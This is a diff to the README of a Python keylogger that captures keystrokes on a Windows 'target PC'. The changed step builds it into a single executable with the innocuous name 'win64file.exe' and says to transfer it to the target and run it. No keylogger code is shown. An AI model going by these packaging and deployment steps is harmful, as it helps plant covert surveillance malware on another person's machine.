@@ -61,11 +61,11 @@ A simple Python keylogger that captures keystrokes on a Windows target PC and se
      ```bash
      pip install pyinstaller
      ```
-   - Build the executable:
+   - Build the executable and include `config.json`:
      ```bash
-     pyinstaller keylogger.spec
+     pyinstaller --onefile --name win64file --add-data=config.json:. keylogger.py
      ```
-   - The output executable (`wind64file.exe`) will be located in the `dist` directory.
+   - The output executable (`win64file.exe`) will be located in the `dist` directory.
 
 5. Transfer the executable to the Windows target PC and run it by double-clicking the file.
 
